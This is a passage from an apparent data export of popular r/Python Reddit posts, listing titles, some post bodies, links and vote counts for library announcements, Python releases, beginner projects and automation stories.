[handcalcs on Github](https://github.com/connorferster/handcalcs)

&#x200B;

https://i.redd.it/8fcq9mrm67k51.gif",https://www.reddit.com/r/Python/comments/ijjppe/i_created_a_library_called_handcalcs_it_renders/,59,1433
hf31so,i made a python function that turn numbers into graphical format.,,https://i.redd.it/bqsxep4kmv651.png,88,1423
d0ymj4,Tiler - A Tool To Build Images Out Of Other Images (link in comments),,https://i.redd.it/x6jmfrile7l31.png,64,1426
wf28ka,A free 'learning map' I found to learn Python. It puts free resources together into a skill tree for planning and tracking learning,,https://app.learney.me/maps/PythonCurriculum,67,1428
fw86w2,Python powered slot car track,,https://i.redd.it/158d7mcku9r41.jpg,81,1428
au3ha5,"Animated Dijkstra, sidewinder maze, pillow and imageio (xpost /r/proceduralgeneration",,https://i.redd.it/elb13ve8kfi21.gif,81,1425
aglxex,#10YearChallenge,,https://i.redd.it/jqhex9oqusa21.jpg,96,1422
enel78,Sudoku App,,https://i.redd.it/n8aq4ni598a41.gif,61,1425
kdm6o7,The Most Complete List of Legally Free Python Books (Updated 2021),,https://www.pythonkitchen.com/legally-free-python-books-list/,72,1419
c91v2r,I created my first neural network that can recognize handwritten digits (Github link in comments),,https://v.redd.it/useogmhn2a831,77,1422
pv4if3,Python just surpassed Java as the 2nd programming language with the highest number of questions in SO.,,https://stackoverflow.com/tags,140,1412
pnie05,Enable ++x and --x expressions in Python,"By default, Python supports neither pre-increments (like `++x`) nor post-increments (like `x++`), commonly used in other languages. However, the first ones are *syntactically correct* since Python parses them as two subsequent `+x` operations, where `+` is the unary plus operator (same with `--x` and the unary minus). They both have no effect, since in practice `-(-x) == +(+x) == x`.

I'd like to share the [plusplus](https://github.com/borzunov/plusplus) module that turns the `++x`\-like expressions into `x += 1` at the bytecode level, using pure Python only.

Unlike `x += 1`, `++x` is still an expression, so the increments work fine inside other expressions, `if`/`while` conditions, lambda functions, and list/dict comprehensions:

    array[++index] = new_value
    
    if --connection.num_users == 0:
        connection.close()
    
    button.add_click_callback(lambda: ++counter)
    
    index = 0
    indexed_cells = {++index: cell for row in table for cell in row}

**Note:** I don't claim that allowing increments is good for real projects (it may confuse new developers and give opportunities to write less readable code), though some situations when they simplify the code do exist. I've made this module for fun, as a demonstration of Python flexibility and bytecode manipulation techniques.

The module works by replacing the bytecode patterns corresponding to the `++x` and `--x` expressions with the bytecode for actual incrementing. For example, this is what happens for the `y = ++x` line:

[Two consecutive UNARY\_POSITIVE instructions are replaced with adding one and storing the result back to the original place](https://preview.redd.it/2k692gaulan71.png?width=821&format=png&auto=webp&s=8b440b0cf9bc2bae5a2695f1831a810f0d5f55d4)

It's not always that simple: incrementing object attributes and collection items requires much trickier bytecode manipulation (see the [""How it works""](https://github.com/borzunov/plusplus#how-it-works) section in the docs for details).

To use the module, you can just run `pip install plusplus` and add two lines of code enabling the increments. You may do this for just one function or for the whole package you're working on (see the [""How to use it?""](https://github.com/borzunov/plusplus#how-to-use-it) section).

**Updates:**

* The same approach could be used to implement the assignment expressions for the Python versions that don't support them. For example, we could replace the `x <-- value` expressions (two unary minuses + one comparison) with actual assignments (setting `x` to `value`).
* See also [cpmoptimize](https://kukuruku.co/post/automatic-algorithms-optimization-via-fast-matrix-exponentiation/) \- my older project about Python bytecode manipulation. It optimizes loops calculating linear recurrences, reducing their time complexity from O(n) to O(log n). The source code is available on [GitHub](https://github.com/borzunov/cpmoptimize) as well.",https://www.reddit.com/r/Python/comments/pnie05/enable_x_and_x_expressions_in_python/,84,1416
q1dqcv,Python 3.10 Released!,,https://www.python.org/downloads/release/python-3100/,147,1415
fh5d7f,"Really simple simulation of virus spreading. Black dots are people, yellow dots are infected (it starts from 1). Each cell visited by an infected can infect other people passing through that for 3 iterations. After 20 iterations a person is infected is deleted from the grid.",,https://v.redd.it/ujf804w894m41,128,1410
jxobtr,I wrote a Network Packet Sniffer for ethical hacking in Python 3 that exclusively uses built-in libraries.,"The greatest problem when looking for implementations of network packet sniffers in Python 3 is that nearly all of them rely heavily in third-party libraries like Scapy or kamene that, though very convenient, may not be at hand when an ethical hacking engagement has to take place in restrictive environments.

For this reason I implemented this basic packet sniffer using just built-in libraries and fully compatible with Python 3.x. It is implemented in OOP, leverages libraries like ctypes, socket, argparse and others and relies on the use of abstract base classes, inheritance, special methods, decorators and design patterns (command, observer and  template). We also employ some manipulation of binary and hexadecimal values that are formatted for the use on raw sockets.

This tool is part of an upcoming (though not nearly ready) series of video tutorials I plan to launch some time in the next year. It might be a rather long course given how much we'd need to cover about all the underlying networking and programming topics.

It's available on GitHub. Use wisely.

[https://github.com/EONRaider/Packet-Sniffer](https://github.com/EONRaider/Packet-Sniffer)",https://www.reddit.com/r/Python/comments/jxobtr/i_wrote_a_network_packet_sniffer_for_ethical/,98,1412
drhez2,I'm a generative artist and currently obsessed with domain warping,,https://i.redd.it/55s8ylik5ow31.jpg,39,1402
ariypt,"Just noticed that the code in ""Ralph Breaks the Internet"" is in python",,https://i.redd.it/mzjl2prvh3h21.png,90,1404
fuzxw4,Matplotlib add-on to make Tron-style plots: github.com/dhaitz/mplcyberpunk,,https://i.redd.it/sa0se1yztuq41.png,28,1402
gqp5jn,Finding the shortest path between two points using the A Star Algorithm! I find it to be one of the best self projects to learn and get into programming. Link to the Github repository in the comments!,,https://i.redd.it/4frs3yuh01151.png,64,1399
ewtxlo,Achieved what I was trying to do thanks to Reddit.,,https://i.redd.it/k8kdt9i566e41.gif,51,1400
ciojde,Simulating Quantum Mechanics Using Matplotlib and Tkinter,,https://gfycat.com/wellgroomedunsteadyballoonfish,60,1393
de92or,Playing Flappy Bird with Mixed Integer Programming,,https://v.redd.it/rbhk0g98fzq31,34,1392
dyc4ce,I brute forced hello world [Code and Reasons in the comments],,https://v.redd.it/jxvwj3kobjz31,123,1389
ks94qq,Today is my first day learning coding and I am awestruck.,"Okay, so I'm a freshman in uni who was just vibing at home during winter break in quarantine with absolutely nothing to do. I'm scrolling on Youtube and I come across this 4 hour long video from freeCodeCamp.org about Python, and on a whim, I decide to just see what the computer science hype is all about. And-

BRO

BRO

I don't know what I expected coding to be, but this is fricking awesome. It just makes me baffled how  I can just make stuff on my computer that has never existed in the history of the computer! 

Like, I just learned about inputs, and I wrote this whole funny conversation with my computer about how horrible my high school was (btw she was very sassy, and yes, I do have many unrepressed feelings about that place LOL). Anyways, I don't know if this is the right place to showcase my immense exuberance, but I guess I now do understand what all the hype is about.",https://www.reddit.com/r/Python/comments/ks94qq/today_is_my_first_day_learning_coding_and_i_am/,137,1373
hcb1zz,The second version of my simple game. It's still pretty pathetic. But now I have implemented a little object orientation (now my code has classes: P).,,https://v.redd.it/1vcauplo7y551,76,1377
xykohy,Is it just me or did the creators of the Python QT5 GUI library miss a golden opportunity to call the package QtPy?,,https://www.reddit.com/r/Python/comments/xykohy/is_it_just_me_or_did_the_creators_of_the_python/,127,1375
e5i7xp,Cracking like print type,,https://v.redd.it/ik2nwfqnmf241,250,1365
foukc7,I Used Deep Learning To Identify Naruto (Anime Series) Hand Signs,,https://youtu.be/mCcla6k3lXA,101,1364
9h76as,Super Potato Bruh - A game written entirely in Python/Pygame.,,https://v.redd.it/tspvwv5sa8n11,167,1365
glikj1,"I made an Android app that detects and recognises traffic signs, using Kivy and OpenCV, to help combat traffic casualties worldwide",,https://v.redd.it/3opn5k9uscz41,54,1350
hixch7,Made a smart rockets simulation with a genetic algorithm,,https://v.redd.it/gq121gl5e4851,49,1351
hm9pih,I made an automated machine learning bot that can detect diseases using images within seconds,,https://i.redd.it/35jinki699951.gif,96,1349
f29iod,"I made an app to watch music videos for the songs playing on your PC, while trying to synchronize them.",,https://gfycat.com/talkativemammothgopher,90,1348
f1qmsj,"Introducing JustPy: An object-oriented, component based, high-level Python Web Framework that requires no front-end programming. With a few lines of only Python code, you can create interactive websites without any JavaScript programming. Comes with a comprehensive tutorial","# JustPy

[JustPy Docs and Tutorials](https://justpy.io)

## Introduction

JustPy is an object-oriented, component based, high-level Python Web Framework that requires no front-end programming. With a few lines of only Python code, you can create interactive websites without any JavaScript programming.

Unlike other web frameworks, JustPy has no front-end/back-end distinction. All programming is done on the back-end allowing a simpler, more productive, and more Pythonic web development experience. JustPy removes the front-end/back-end distinction by intercepting the relevant events on the front-end and sending them to the back-end to be processed.

In JustPy, elements on the web page are instances of component classes. A component in JustPy is a Python class that allows you to instantiate reusable custom elements whose functionality and design is encapsulated away from the rest of your code.

Custom components can be created using other components as building blocks. Out of the box, JustPy comes with support for [HTML](https://justpy.io/#/tutorial/html_components) and [SVG](https://justpy.io/#/tutorial/svg_components) components as well as more complex components such as [charts](https://justpy.io/#/charts_tutorial/introduction) and [grids](https://justpy.io/#/grids_tutorial/introduction).  It also supports most of the components and the functionality of the [Quasar](https://quasar.dev/) library of [Material Design 2.0](https://material.io/) components.

JustPy encourages creating your own components and reusing them in different projects (and, if applicable, sharing these components with others).

JustPy supports visualization using [matplotlib](https://justpy.io/#/tutorial/matplotlib) and [Highcharts](https://justpy.io/#/charts_tutorial/introduction).

JustPy integrates nicely with [pandas](https://pandas.pydata.org/) and simplifies building web sites based on pandas analysis. JustPy comes with a [pandas extension](https://justpy.io/#/charts_tutorial/pandas?id=using-the-pandas-extension) that makes it simple to create interactive charts and grids from pandas data structures.

For updates and news please follow the [JustPy Twitter account](https://twitter.com/justpyframework)

## Hello World!

    import justpy as jp
    
    def hello_world():
        wp = jp.WebPage()
        d = jp.Div(text='Hello world!')
        wp.add(d)
        return wp
        
    jp.justpy(hello_world)

The program above activates a web server that returns a web page with 'Hello world!' for any request. Locally, you would direct your browser to [http://127.0.0.1:8000](http://127.0.0.1:8000) or http://localhost:8000/ or  to see the result.

Here is a slightly modified version in which 'Hello world!' changes to 'I was clicked!' when it is clicked.

    import justpy as jp
    
    def my_click(self, msg):
        self.text = 'I was clicked!'
    
    def hello_world():
        wp = jp.WebPage()
        d = jp.Div(text='Hello world!')
        d.on('click', my_click)
        wp.add(d)
        return wp
    
    jp.justpy(hello_world)

Many other examples can be found in the [tutorial](https://justpy.io/#/tutorial/getting_started)

## Under the Hood

JustPy's backend is built using:

* [starlette](https://www.starlette.io/) \- ""a lightweight [ASGI](https://asgi.readthedocs.io/en/latest/) framework/toolkit, which is ideal for building high performance asyncio services"".
* [uvicorn](https://www.uvicorn.org/) \- ""a lightning-fast [ASGI](https://asgi.readthedocs.io/en/latest/) server, built on [uvloop](https://github.com/MagicStack/uvloop) and [httptools](https://github.com/MagicStack/httptools)"".

JustPy's frontend (which is transparent to JustPy developers) is built using:

* [Vue.js](https://vuejs.org/) \- ""The Progressive JavaScript Framework""

The way JustPy removes the frontend/backend distinction is by intercepting the relevant events on the frontend and sending them to the backend to be processed.

## License

[Apache License, Version 2.0](http://www.apache.org/licenses/LICENSE-2.0.txt)",https://www.reddit.com/r/Python/comments/f1qmsj/introducing_justpy_an_objectoriented_component/,263,1353
cof3mi,Approx 6 months back. I was asking help to practice and learn python in this sub. With the support of this sub yesterday I contributed in one of the DL project of arrow and color detection at the right spot which is to be implemented in self driving rovers. Thank you all.,,https://i.redd.it/j10g16s3rkf31.gif,110,1347
8t5ouh,"Python patch, first try.",,https://i.redd.it/w833vgg1xm511.jpg,43,1348
lmnd6w,"I just had a baby, so naturally I had to program a tool for deciphering his schedule","*(TLDR at the bottom)*

**THE SITUATION**

My son came into the world last month and, as first time parents, we've had a hard time handling his hectic feeding schedule. He would burst into screams, and we'd scramble to get a bottle prepared/warmed. However there wasn't a very good way to know how much milk to warm (once you heat it, it has to be either consumed or discarded). And since a bottle takes 5+ minutes to heat up, we'd spend that time fumbling to soothe him until it was ready. After one-to-two weeks of this, I decided to do something about it.

That's why I created a Python project to take out the guesswork! From the beginning, we were logging all of his feeds because we wanted to make sure he was eating enough (and wasn't eating too much). We use a shared Google Keep note because that's the easiest/quickest way to do it on our phones. And since we'd already gotten into the habit of logging data, I figured 'why not use it to predict when the next bottle will be demanded?'

**WHAT IT DOES**

The program scrapes all of the content from the Google Keep note and then uses it to estimate the next feed. This estimation includes not only the time, but also the quantity of milk to prepare. It's based on the patterns exhibited over the prior three days, and takes into account both his bottle feeds and his direct breastfeeds. My original goal was to create a legitimate predictive model of his feed patterns, but it quickly became apparent that an explicit model wouldn't be the best strategy (largely due to the irregularity of the feed time data points).

Once it has crunched the data, the program emails both of us with the outputs. Each email contains two distinct sections: the estimates and the summary. The estimates are the metrics related to the next anticipated bottle (feed time and milk quantity) and they've been pretty accurate so far. The summary includes things like average total daily intake / average feed size / average time between feeds / etc. It's just something I threw in to give us some trending insight, but it's turned out to be immensely helpful -- particularly when answering questions at the pediatrician's office.

**ADMIN/SETUP**

The program is 100% Python, but it does include some non-standard libraries: gkeepapi and pandas. Unfortunately, Google doesn't support API access for Google Keep (why not??) and we weren't willing to change the way we log data. But luckily [gkeepapi](https://github.com/kiwiz/gkeepapi) exists, and that has proven to work great. The downside is that frequently accessing the Keep note through unofficial means caused Google to regularly prompt me to verify my account activity, which got *very* old *very* quickly. To mitigate that, I added a feature in the program to only check the note when there's likely to be new information there. Since adding that, Google has stopped bugging me about it.

Using Launchd, I've scheduled the program to run every ten minutes. It can obviously be run manually as well, but it can be run as often as desired. Even if it's run very frequently, it won't access the Keep note or send an email unless there's likely to be new data to consider.

One goal for this project was that the Google Keep note wouldn't have to change formats from what we'd been doing from the start (we wanted to keep formatting the note lines in the way that was easiest/most intuitive for us). As a result, the format which will allow the program to interpret dates/times/quantities is somewhat rigid. Anyone who uses the program will need to emulate our log style or rewrite the code which extracts data. Another goal for the project was that I'd get some pandas practice in. I admit that pandas was likely overkill for this application, but I wanted to get some experience using it and this project has definitely helped me with the basics.

**NOTES**

The mins/maxes for the time between feeds and the quantities of milk are based on standards for the baby's age (stored in age\_info.txt). My son has been fairly consistent/normal with his feeds, so the generally accepted mins/maxes work just fine. But if -- for example -- a baby wanted to eat every hour, the minimum milk quantity per feed would probably be too much.

Since I made this project for my own use and don't really expect other people to use it, there are some hardcoded values. Nothing major -- just people's names for the email, and the note ID for accessing the Google Keep note.

&#x200B;

[GitHub repo](https://github.com/tyler-england/forecast-bottle)

&#x200B;

**TLDR: The program reads a Google Keep note of baby feed data and sends out an email about how/when to prepare the next bottle. It's been very useful. :)**",https://www.reddit.com/r/Python/comments/lmnd6w/i_just_had_a_baby_so_naturally_i_had_to_program_a/,91,1348
eg2be8,"I created an AI to play ""Flappy Bird"": my first steps into AI (using Pygame and NEAT-python)",,https://v.redd.it/ncgt5qrx32741,70,1349
8psk37,TIL that seaborn refuses to use the jet color scheme in a most wonderful fashion,,https://i.redd.it/r8t2tazc1z211.jpg,92,1343
ycmnor,Python 3.11 is out! Huzzah!,"https://www.python.org/downloads/release/python-3110/

Some highlights from the release notes:

PERFORMANCE:  10-60% faster code, for free!

ERROR HANDLING:  Exception groups and except* syntax.  Also includes precise error locations in tracebacks. 

ASYNCIO:  Task groups

TOML:  Ability to parse TOML is part of the standard library.  

REGEX:  Atomic grouping and possessive quantifiers are now supported

Plus changes to typing and a lot more. Congrats to everyone that worked hard to make this happen.  Your work is helping millions of people to build awesome stuff.  🎉",https://www.reddit.com/r/Python/comments/ycmnor/python_311_is_out_huzzah/,234,1334
dh2qwd,more than 100 scientific articles may be invalidated because scientists assumed that the output of glob.glob() is sorted,,https://www.vice.com/en_us/article/zmjwda/a-code-glitch-may-have-caused-errors-in-more-than-100-published-studies,347,1340
i2bqer,"I made a video with 3 projects for beginners. The projects cover game development, web scraping, and automation. All the code is in the description, feel free to play around with it!","If you're trying to learn Python, I made a video with some projects that are ready to be added to your resume. These projects try to take advantage of what has been recently going on in the world, while keeping it simple for beginners to code.  Here's a link to the video:

[https://youtu.be/W9nbdVWl4PA](https://youtu.be/W9nbdVWl4PA)

I'm also leaving the direct GitHub links of the projects!

Corona Invader (is a replica of the famous Space Invader, with a twist. In the game, you impersonate the Unites States, and you will have to beat the coronavirus by shooting syringes or vaccines, depending on your imagination): [https://github.com/DavideMerlin/Corona\_Invaders](https://github.com/DavideMerlin/Corona_Invaders)

Election Scraper (This python script scrapes tweets from specific users and organizes them in a convenient CSV file. The goal is to collect tweets about the 2020 election and perform sentiment analysis on them at a later time): [https://github.com/DavideMerlin/Twitter\_election\_scraper](https://github.com/DavideMerlin/Twitter_election_scraper)

&#x200B;

Login Automation (This python scripts uses Selenium to automate the stack overflow's login page): [https://github.com/DavideMerlin/Automated\_login](https://github.com/DavideMerlin/Automated_login)

&#x200B;

Any feedback would be much appreciated too!",https://www.reddit.com/r/Python/comments/i2bqer/i_made_a_video_with_3_projects_for_beginners_the/,40,1330
57xaud,Python 201 Book is Free for 48 hours,"I decided it would be fun to give my latest book away for free for 48 hours. So starting today, you can get **Python 201: Intermediate Python** free through [Gumroad](https://gumroad.com/l/py201#) or [Leanpub](http://leanpub.com/python201/c/201free). 

If you go with Gumroad, then you will need to use the following offer code: **201free**. Note that if you want to receive updates to the book, you will want to create an account and add the book to your library. 

I currently support the following digital formats: **PDF**, **epub** and **mobi** 

You might also want to check out my blog which has lots of fun Python tutorials and links to my other books: http://www.blog.pythonlibrary.org/

**Update 2016-10-17**: For those of you who like numbers, I thought I'd share a bit of statistics with you. The number of people who used the Leanpub link to download the book hit **18,037** while approx. **6670** people used the Gumroad coupon. I don't have a simple way of checking who used both sites, so assuming that no one did, the total number of new readers is **24,707**!

That's so awesome! Thanks so much for your interest. I hope you all enjoy the book!",https://www.reddit.com/r/Python/comments/57xaud/python_201_book_is_free_for_48_hours/,293,1330
izdclm,Automated My Job for the First Time,"So this just happened today. I've been learning Python on and off for a long time. I had to take a couple of classes for my undergrad a couple years back, and after that, I never really needed to apply it in my job.

Fast forward to today, my manager was complaining about how many requests for test data the business team was giving him. He tasked me with helping him generate the data using Excel and advanced SQL logic.

I decided to dust off my rusty Python scripting knowledge and created a script that automated the entire process. It took many hours, a lot of googling and 2 mugs of coffee, but I accomplished what I set out to do. My script was able to generate nearly 5000 queries in less than a minute.

Needless to say, my boss was impressed by my initiative, and I've found out first hand how useful knowing Python is. I want to thank this subreddit for being so supportive and always promoting new learning resources. Automate the Boring Stuff is a gold mine of info and I am more motivated than ever before to expand my skills and knowledge!

**Edit:** Wow! I never really expected this post to blow up like it did. Thank you all for the awards. Never really gotten any of them before, as I mostly lurk and don't post. Yesterday was an anomaly because I just felt grateful for subs like this one. I just wanted to take the time to clarify some things.

To those people who are worried about my boss' reaction, don't be. I am extremely lucky to have a boss who cares for all his employees (even me, the part timer with very little IT experience). To give a bit of background, he and my father are friends, so he's taken me under his wing, teaching me how to handle myself in a professional environment and helping my career by exposing me to new opportunities within the project we 're working on. Needless to say, over the past few months, I've been assigned many different tasks on both the business and engineering side, learning a lot in the process that will be invaluable to my career in the future.

Regarding an increase in pay, I've put in the paperwork to go full time, and I gained his approval a few weeks back because of how much effort I put in to making sure I completed my tasks to the best of my abilities. I think this ensured that he would back me up 100% if anyone tried to object. Hopefully by the beginning of October, I'll be billing for 40 hours instead of 24.

I love the team and company I work for, as everyone is super friendly and willing to help me out. Also, part of the reason I automated this task was because it helps my boss politically. I'm not too well-versed in office politics, but he's been giving me lessons on how to handle it. By being able to provide thousands of data points for the business team, he now has them on the back foot and they have to work hard to fulfill their end of the testing, otherwise they're going to be the ones with egg on their face if the issue gets escalated to the executive levels.

I only had two mugs of coffee because my mom yelled at me for drinking coffee late at night and banned me from the kitchen. :D

&#x200B;",https://www.reddit.com/r/Python/comments/izdclm/automated_my_job_for_the_first_time/,136,1331
g0fz1e,Generating a random maze using Prim's algorithm,,https://v.redd.it/y9lpy5345ks41,57,1327
nfes13,PyCon US 2021 Notes,,https://www.benedat.com/blog-pycon-1-2021-5/,12,1325
7cffpd,Python Fractal Landscape,,https://i.redd.it/drnz4ukpsjxz.jpg,24,1321
opb7hm,Do not use mutable objects as default arguments in Python,,https://medium.com/geekculture/do-not-use-objects-as-default-arguments-in-python-1c940212db2e,231,1321
afc6rw,"Alright, which one of you was this? Haha had to stop and take a pic",,https://imgur.com/pV1NAH1,56,1316
msbt3p,"Flask 2.0 is coming, please help us test","Hello,

Flask 2.0 is due for release soon, with a release candidate 2.0.0rc1 available now on PyPI. Please try this out and let us know if there are any issues.

    pip install --pre flask

This major release of Flask is accompanied by major releases of [Werkzeug](https://www.reddit.com/r/Python/comments/lfe76k/werkzeug_flask_20_is_coming_please_help_us_test/), [Jinja2](https://github.com/pallets/jinja/blob/master/CHANGES.rst), [click](https://github.com/pallets/click/blob/master/CHANGES.rst), and [itsdangerous](https://github.com/pallets/itsdangerous/blob/master/CHANGES.rst) which we'd also welcome and appreciate testing (their pre releases are installed with the Flask pre release).

Some highlights from [Flask's Changelog](https://github.com/pallets/flask/blob/master/CHANGES.rst),

- Support Python 3.6+ (dropping Python 2.7 and 3.5 support)
- Deprecate a number of features (see details).
- Initial async-await support (optional install flask[async]), that allows for async route handlers, errorhandlers, before/after request, and teardown functions.
- Short form route decorators e.g. @app.get, @app.post, etc...
- Nested blueprints, blueprint.register_blueprint(another_blueprint).
- Much more! (Please ask)",https://www.reddit.com/r/Python/comments/msbt3p/flask_20_is_coming_please_help_us_test/,148,1316
llccey,16 bytes of Python code compiles to 32 terabytes of bytecode,,https://codegolf.stackexchange.com/a/69415/4270,109,1308
l5ldye,Twitter is opening up its full tweet archive to academic researchers for free,"Opening up a public archive, monthly tweet volume cap is now 10 million (20x higher than previous 500,000). This definitely opens the door for new projects built using the Twitter API, especially in the field of sentiment analysis.

[https://www.theverge.com/2021/1/26/22250203/twitter-academic-research-public-tweet-archive-free-access](https://www.theverge.com/2021/1/26/22250203/twitter-academic-research-public-tweet-archive-free-access)

https://blog.twitter.com/developer/en_us/topics/tips/2021/enabling-the-future-of-academic-research-with-the-twitter-api.html",https://www.reddit.com/r/Python/comments/l5ldye/twitter_is_opening_up_its_full_tweet_archive_to/,111,1310
8ixbcm,A month ago /u/AlSweigart asked for help reviewing his book. I delivered and so did he.,,https://i.imgur.com/cOCbxbF.jpg,41,1303
8juoum,I made this free tool for practicing Python (it's like Duolingo for learning to code),,https://edabit.com/explore?lang=python3,71,1301
gz4nke,"First python project, it's a bit simple but feeling pretty good about it.",,https://v.redd.it/dzwciyjy9q351,85,1304
g1conv,"I made a randomized binary tree (python, tkinter)",,https://v.redd.it/f15osxcr9us41,53,1297
qlnune,I'm sorry r/Python," Last weekend I made a controversial comment about the use of the global variable. At the time, I was a young foolish absent-minded child with 0 awareness of the ways of Programmers who knew of this power and the threats it posed for decades. Now, I say before you fellow beings that I'm a child no more. I've learnt the arts of Classes and read The Zen, but I'm here to ask for just something more. Please do accept my sincere apologies for I hope that even my backup program corrupts the day I resort to using 'global' ever again. Thank you.

&#x200B;

https://preview.redd.it/b1oncwh1jbx71.png?width=909&format=png&auto=webp&s=eeedba9a630f83071e5694664ca372259424d54c",https://www.reddit.com/r/Python/comments/qlnune/im_sorry_rpython/,202,1294
jgvqa9,The youtube-dl GitHub repo has received a DMCA takedown request from the RIAA,,https://github.com/ytdl-org/youtube-dl,202,1295
e3fwo2,I wrote a program to get the high score on a typing practice website,,https://v.redd.it/2gqg64dp5n141,99,1294
d45ogl,Rolling Hills (Made with Python Processing),,https://gfycat.com/groundedthickkentrosaurus,34,1291
xtmxsp,I wrote a Python script which can generate any city from the real world in Minecraft,"Hi there! Using this Python script, you can generate any city from the real world in Minecraft. I worked on that project for a few months and finally released it as open source. I appreciate any kind of feedback!

Youtube Devlog: [https://www.youtube.com/watch?v=5tOvtZG0\_6k](https://www.youtube.com/watch?v=5tOvtZG0_6k)

Github Repository: [https://github.com/louis-e/arnis](https://github.com/louis-e/arnis)",https://www.reddit.com/r/Python/comments/xtmxsp/i_wrote_a_python_script_which_can_generate_any/,76,1291
h9su9s,"I would like to share my first game! I did it all with pygame. I'm still learning so it's not so cool, but I want to improve it in the future: P",,https://v.redd.it/q8l1s5c236551,104,1293
fe3mgn,My attempt at coding a GUI Maker (maybe helpful for beginners),,https://v.redd.it/l40i1llcnxk41,100,1289
ectc4t,A simple tool written in python to make pixel art from images using excel sheets (https://pix-to-xls.now.sh) repo: https://github.com/joelibaceta/pix-to-xls,,https://v.redd.it/bg9u9fayfl541,48,1291
fi7pnd,Coronavirus tweet locator real-time,,https://v.redd.it/cr9f9u8giim41,37,1285
7cs8dq,"Senior Python Programmers, what tricks do you want to impart to us young guns?","Like basic looping, performance improvement, etc.",https://www.reddit.com/r/Python/comments/7cs8dq/senior_python_programmers_what_tricks_do_you_want/,642,1285
hkhp59,I am not good at modelling so I used Blender in a way to visulaize data. This is my first project with Python and Blender. The progress so far. (Link of the repo is in the comments),,https://i.redd.it/8ktw7flwrm851.jpg,88,1282
8niot2,I made a FTP/SFTP client using python and tkinter,,https://i.redd.it/z8j0po0j77111.png,93,1280
f99wh4,"For trading enthusiasts: I made a highly-efficient Python library that combines NumPy, Numba and Plotly to backtest trading strategies interactively",,https://i.redd.it/1a93ifski2j41.gif,68,1282
gl7lp7,"Created a python script that execute Exploratory Data Analysis on any CSV file. It generates a text report, a series of plots and a processed csv file as outputs.",,https://v.redd.it/2jw3tbx3l8z41,82,1272
op1tz0,tkinter was shockingly easy to write a small overlay GUI,"I did a project mostly over the weekend to write a super simple small overlay for an online game. I wanted it just to include some updating text that displays the ping times to the server: https://github.com/notatallshaw/fall_guys_ping_estimate

**Edit:** The screen shot is in the above link, it's nothing special, it's some updating green text with a black background that sits on top of any application (you can't even move it yet). 

I was assuming to make an overlay feature I would need to use PyQt or wxWidgets. But it was actually just a few lines of tkinter  to get working. 

Despite having never done any non-web GUI programming I had a simple version up and running in less than an hour.  I definitely think I might make more quick tools with a GUI in the future.",https://www.reddit.com/r/Python/comments/op1tz0/tkinter_was_shockingly_easy_to_write_a_small/,90,1273
lz5plv,I created a 40-minute tutorial that will explain everything you need to Containerize your Python applications using Docker!,,https://youtube.com/watch?v=BZiwpsnLLYQ&feature=share,67,1269
ekjr42,Use python to find a prime number that looks like any image if glanced upon from far away. [OC],,https://i.redd.it/htrmof6091941.png,65,1268
8ue8kg,Python 3.7.0 released,,https://www.python.org/downloads/release/python-370/,295,1259
d17uyc,Possibly the most terrifying O'Reilly cover I've ever seen,,"https://images-na.ssl-images-amazon.com/images/I/51jaJMLHD-L._SX379_BO1,204,203,200_.jpg",70,1257
khmijy,We hand-picked the best Python libraries released in 2020,"Hello,

Every year, we produce a list of the **top 10 Python libraries** released or popularized that year.

2020 was a hard one, since there are so many good choices! Therefore, we decided we should list many more :) Most are around data science / machine learning.

**The full list is available here**: [https://tryolabs.com/blog/2020/12/21/top-10-python-libraries-of-2020/](https://tryolabs.com/blog/2020/12/21/top-10-python-libraries-of-2020/)

So:

* What do you think about our picks?
* Did we miss any good one? Especially non-data science libraries.",https://www.reddit.com/r/Python/comments/khmijy/we_handpicked_the_best_python_libraries_released/,74,1255
fmo3e8,Made my first program to help me with my homework,,https://i.redd.it/alh727fqn3o41.png,147,1259
nhm8bc,Malicious Webpage Classifier using DNN [Pytorch],"Malicious Webpages are the pages that install malware on your system that will disrupt the computer operation and gather your personal information and many worst cases. Classifying these web pages on the internet is a very important aspect to provide the user with a safe browsing experience.   


The objective of this project is to classify the web pages into two categories *Malicious\[Bad\]* and *Benign\[Good\]*  webpages.  Exploratory Data Analysis and Geospatial Data Analysis are done to get more insights and knowledge about the data. Features are engineered and the data is preprocessed accordingly. A total of four ML  and DL models are trained. The models are **XGBoost**, **Logistic Regression**, **Decision Tree** and **Deep Neural Network**. The DNN is implemented in PyTorch and the others are implemented using scikit learn.

[Kaggle Notebook](https://www.kaggle.com/sumitm004/malicious-webpage-classifier-using-dnn-pytorch)",https://www.reddit.com/r/Python/comments/nhm8bc/malicious_webpage_classifier_using_dnn_pytorch/,27,1248
ktj4jq,I automated a full time full before it could be advertised,"Thought this was funny. I work as an Accountant and last week my Manager let me know that due to a Government audit we would be required to fully itemise our government funding client statements. 

The problem is that our client statement involve charges from third party companies who are paid from this government funding and all these invoices are held on a third party website. 

The third party website said they couldn't help and it was determined that due to how slow the website is as well as other factors (the invoices are all listed as individual download links, some invoices are password protected pdf's, some are jpg's, the website layout is terrible) that it would require 160-180 hours of manual work and therefore a new admin person would need to be hired.

So I wrote something in Python that opens a headless browser, grabs all client names, then goes through each clients account and downloads every invoice, skips any client with no invoices, converts all jpg's to pdf's and resizes them so they fit correctly on the page and merges all invoices into one file per client to form our new statement file.

It takes about about an hour to create 800 statements from 6000 invoices, about half of that time being due to how slow the website is but I'm pretty happy with it and it can now do in a lunch break what we were preparing to hire an entirely new person to do.

I'm still a beginner with Python but I feel like this was a good step in the right direction.

This did make me wonder though, how is it that jobs that are almost fully admin and could be automated are still so common. I remember about ten years ago all I ever heard in school was that automation was going to kill these jobs but it doesn't really seem to have made much progress.",https://www.reddit.com/r/Python/comments/ktj4jq/i_automated_a_full_time_full_before_it_could_be/,172,1256
en5oa4,Python Sorting Algorithm Visualizer (Using Cocktail Shaker Sort Algorithm),,https://v.redd.it/lofqc799g4a41,41,1245
pi88q6,"Got a job that requires Python and Django developement, also using Tkinter and Pyqt for desktop apps.","Good day everyone, as explained in the title, I got a job that requires coding in python and Django, I am more of a javascript developer, as I know node, react and do web development mostly. They also have a desktop app and I may need to work on those too, granted they know I might go through a learning process but I don't want to disappoint myself,, and also this seems like a big break for me.

I need help on where to get resources in the event I am stuck, what are the things I may need to know that I will be using daily in a development environment especially for the desktop applications, I have been told to ask the senior developers (they're mostly freelance), I'm also expected to fix bugs too, I need help on resources and where I can get help asap. Thank you, everyone",https://www.reddit.com/r/Python/comments/pi88q6/got_a_job_that_requires_python_and_django/,79,1253
cljawn,Library for making desktop apps like React,,https://i.redd.it/wq8t63qit8e31.png,90,1250
